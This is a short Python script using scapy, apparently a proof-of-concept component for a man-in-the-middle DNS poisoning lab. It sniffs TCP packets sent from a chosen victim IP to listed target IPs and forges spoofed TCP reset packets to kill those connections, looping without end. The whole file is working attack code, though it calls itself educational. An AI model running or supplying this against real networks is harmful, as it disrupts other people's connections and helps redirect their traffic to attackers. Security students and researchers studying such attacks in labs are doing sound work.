
from scapy.all import *
from scapy.layers.inet import TCP, IP
import argparse


def parse_args():
    p = argparse.ArgumentParser(description="RST PKTS sender for DNS POSIONING PoC, MITM required - educational lab use only")
    p.add_argument("--victim-ip", required=True, help="IP of the target host")
    p.add_argument("--iface", required=True, help="Network interface number (e.g. 15)")
    p.add_argument("--target-ips", required=True, nargs="+", help="target IP addresses for RST pkts")
    return p.parse_args()



def RST_packet(victim_ip, RST_ips,my_interface):
    #filter function inside the main function
    def cont(pkt):
        if (TCP in pkt and IP in pkt):
            if (pkt[IP].src == victim_ip and pkt[IP].dst in RST_ips):
                print(f"catached the ip {pkt[IP].dst}")
                return True
        return False
    count = 0
    while True:
        print("[i] Starting RST...")
        pkt = sniff(count=1, lfilter=cont, iface=my_interface)
        print(pkt[0][IP].src)
        RST_pkt = IP(dst=pkt[0][IP].src, src=pkt[0][IP].dst) / TCP(dport=pkt[0][TCP].sport, sport=pkt[0][TCP].dport,
                  flags="R", seq=pkt[0][TCP].ack)
        send(RST_pkt)
        print("[i] RST packet sent successfully")

def main():
    args = parse_args()
    my_interface = IFACES.dev_from_index(args.iface)  # the actual interface to spoof by
    victim_ip = args.victim_ip
    RST_ips = args.target_ips

    print("[i] RST script starting...")
    t1 = threading.Thread(target=RST_packet, args=(victim_ip,RST_ips,my_interface))
    t1.start()

if __name__ == '__main__':
    main()
